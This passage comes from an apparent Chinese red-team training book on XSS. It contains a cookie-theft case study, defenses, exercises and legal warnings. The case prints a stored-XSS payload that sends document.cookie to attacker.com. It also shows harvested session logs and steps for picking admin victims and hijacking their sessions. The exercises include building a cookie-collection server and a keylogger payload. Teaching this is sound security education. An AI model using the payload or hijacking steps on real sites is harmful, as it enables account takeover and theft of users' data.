---

### 案例5：Cookie窃取与会话劫持

**场景**：你在一个电商网站发现了存储型XSS漏洞。

**目标**：利用XSS窃取用户Cookie，并通过Cookie欺骗登录用户账号。

**步骤**：

1. **确认XSS漏洞**
   - 在商品评论区提交XSS Payload
   - 确认存在存储型XSS

2. **构造窃取Cookie的Payload**
   ```html
   <img src=x onerror="this.src='http://attacker.com/steal.php?c='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(location.href)" style="display:none">
   ```

3. **发布Payload**
   - 在热门商品的评论区发布恶意评论
   - 等待其他用户查看商品详情时触发

4. **收集Cookie**
   - 监控攻击者服务器的日志
   - 收集到大量用户的PHPSESSID
   ```
   [2024-01-01 12:00:00] IP: 1.2.3.4
   Referer: https://shop.com/product/123
   Cookie: PHPSESSID=abc123def456...; user_id=1001
   ```

5. **选择目标**
   - 从收集到的Cookie中，选择user_id较大的（可能是老用户或VIP）
   - 或选择Referer中有/admin路径的（可能是管理员）

6. **Cookie欺骗**
   - 使用浏览器打开目标网站
   - 按F12打开开发者工具
   - 进入Application/Storage → Cookies
   - 修改PHPSESSID为窃取到的值
   - 刷新页面

7. **验证登录**
   - 页面刷新后，成功以目标用户身份登录
   - 可以查看用户的个人信息、订单记录、收货地址等
   - 甚至可以修改密码、下单等操作

8. **提升权限（如果目标是管理员）**
   - 如果窃取到管理员的Cookie
   - 可以访问后台管理系统
   - 管理商品、订单、用户等
   - 可能进一步获取服务器权限

**防御方法**：
1. 设置Cookie的HttpOnly属性，防止JS读取
2. 设置Cookie的Secure属性，只在HTTPS下传输
3. 设置SameSite属性，防止CSRF和部分XSS利用
4. 绑定Cookie和IP/User-Agent（有一定效果但也可能被绕过）
5. 敏感操作要求二次验证（密码、验证码等）

**总结**：Cookie窃取是XSS最常见的利用方式之一，可直接导致用户账号被盗。设置HttpOnly是重要的防御手段，但不能完全防御XSS，还需要从源头上修复XSS漏洞。

---

## ✏️ 课后习题

### 选择题

1. XSS的三种类型不包括以下哪种？
   - A. 反射型XSS
   - B. 存储型XSS
   - C. DOM型XSS
   - D. 传输型XSS

2. 以下哪个标签不能用于XSS？
   - A. `<img>`
   - B. `<svg>`
   - C. `<div>`
   - D. `<script>`

3. 当空格被过滤时，以下哪个不能代替空格？
   - A. `/`
   - B. `%09`（制表符）
   - C. `%0a`（换行符）
   - D. `%00`（NULL字节，某些场景）

4. DOM型XSS的特点是？
   - A. 必须经过服务器处理
   - B. 完全在客户端执行
   - C. 必须存储在数据库中
   - D. 只能通过Cookie利用

5. 以下哪个是JavaScript伪协议？
   - A. `http:`
   - B. `https:`
   - C. `javascript:`
   - D. `ftp:`

6. 窃取Cookie的XSS Payload中，document.cookie获取的Cookie不包括？
   - A. 带有HttpOnly属性的Cookie
   - B. 带有Secure属性的Cookie
   - C. 带有SameSite属性的Cookie
   - D. 带有Expires属性的Cookie

7. 以下哪个事件是自动触发的（不需要用户交互）？
   - A. onclick
   - B. onmouseover
   - C. onload
   - D. onkeydown

8. HTML实体编码中，`<` 被编码为？
   - A. `&lt;`
   - B. `&gt;`
   - C. `&quot;`
   - D. `&amp;`

9. 以下哪种方法不能防御XSS？
   - A. 输出时HTML实体编码
   - B. 使用CSP
   - C. 设置HttpOnly Cookie
   - D. 使用HTTPS

10. 存储型XSS和反射型XSS的主要区别是？
    - A. 注入的位置不同
    - B. 存储位置不同，存储型存在服务器端
    - C. 危害程度相同
    - D. 利用方式完全不同

### 填空题

1. XSS的全称是 _______。
2. XSS的三种类型是 _______、_______、_______。
3. XSS中用于窃取Cookie的JS对象是 _______。
4. 防止Cookie被JS读取的属性是 _______。
5. DOM型XSS中，常见的危险方法有 _______、_______、_______。
6. href属性中执行JS的伪协议是 _______。
7. 用于定义网页安全策略的HTTP头是 _______。
8. HTML中 `<img>` 标签加载失败时触发的事件是 _______。
9. 在JavaScript中，`\u0061` 代表字符 _______。
10. data URI中表示HTML内容的MIME类型是 _______。

### 简答题

1. 简述XSS的三种类型及其区别。
2. 反射型XSS和存储型XSS哪个危害更大？为什么？
3. 当script标签被过滤时，有哪些绕过方法？至少说出5种。
4. DOM型XSS的特点是什么？如何发现和防御？
5. 什么是XSS平台？它有哪些主要功能？
6. 如何防御XSS攻击？至少说出5种方法。
7. Cookie窃取的原理是什么？如何防御？
8. 什么是CSP？它如何防御XSS？
9. HTML实体编码在什么情况下不能防御XSS？请举例说明。
10. 键盘记录型XSS的原理是什么？

### 实操题

1. 访问Google XSS Game（https://xss-game.appspot.com/），通关前6关。
2. 在DVWA的XSS (Reflected)模块中，尝试使用至少5种不同的Payload实现弹窗。
3. 在DVWA的XSS (Stored)模块中，实现Cookie窃取功能。
4. 搭建一个简易的XSS接收平台，实现Cookie窃取功能。
5. 找到一个DOM型XSS的例子（可以自己写一个简单页面），并成功利用。
6. 尝试使用不同的事件处理器（至少5种）实现XSS弹窗。
7. 练习使用JavaScript编码绕过关键字过滤（如alert被过滤）。
8. 构造一个键盘记录的XSS Payload，并在测试环境中验证。
9. 学习使用XSS Hunter或类似的XSS扫描工具。
10. 总结XSS绕过的各种技巧，整理成一个Cheat Sheet。

---

## ⚠️ 安全提醒

::: danger 重要提醒
1. **仅在授权环境中练习**：本章涉及的XSS技术仅限在授权靶场中学习和练习，严禁对未授权的真实系统进行测试。

2. **法律后果**：利用XSS窃取他人Cookie、篡改网页内容、传播恶意代码等行为均属于违法行为，将承担相应的法律责任。

3. **隐私保护**：XSS可以窃取用户的敏感信息（密码、个人信息等），请勿用于非法用途。

4. **道德准则**：学习XSS是为了更好地防御，保护用户隐私和网站安全。请遵守网络安全从业者的职业道德。

5. **合法研究**：如果发现真实网站的XSS漏洞，应通过合法渠道（如SRC平台）上报，而不是利用或传播。

6. **传播风险**：存储型XSS可能影响大量用户，请不要在公共平台发布恶意Payload。
:::

---

## 📝 本章小结

- XSS分为反射型、存储型和DOM型三种，其中存储型危害最大
- XSS的利用方式多样，从简单的弹窗到Cookie窃取、键盘记录、内网探测等
- 常见的绕过技巧包括：标签绕过、编码绕过、事件注入、属性注入等
- DOM型XSS完全在客户端执行，传统的服务端防护难以检测
- XSS平台是XSS攻击的重要辅助工具，用于收集和管理攻击结果
- Cookie窃取是XSS最常见的利用方式，设置HttpOnly可以缓解但不能根治
- 防御XSS的核心是正确的输出编码，配合CSP、HttpOnly等多层防御
- 不同的上下文（HTML、JS、CSS、URL）需要不同的编码方式
- XSS的绕过技巧层出不穷，需要持续学习和关注最新的安全研究

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day086-target-靶场2-SQLi-Labs)
- [➡️ 下一章：---](/redteam/day088-target-靶场4-Upload-Labs)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
